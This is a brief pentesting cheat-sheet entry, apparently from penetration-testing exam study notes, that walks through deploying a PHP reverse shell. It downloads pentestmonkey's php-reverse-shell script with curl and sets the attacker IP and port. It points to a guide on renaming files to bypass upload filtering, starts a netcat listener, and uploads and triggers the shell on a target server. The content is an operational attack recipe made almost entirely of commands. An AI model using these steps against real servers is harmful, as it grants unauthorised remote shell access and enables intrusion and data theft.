# PHP reverse shell

First, download the script:

```bash
curl -LO https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Change `ip` and `port` in the script (use `ip addr` for ip, `port` can be anything that's available):

```bash
nano php-reverse-shell.php
```

Also probably rename, see [Bypass File Upload Filtering](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html).

Next, start `nc`:

```bash
nc -lvnp <PORT>
```

Finally, upload the script to the server, and open the newly created link.
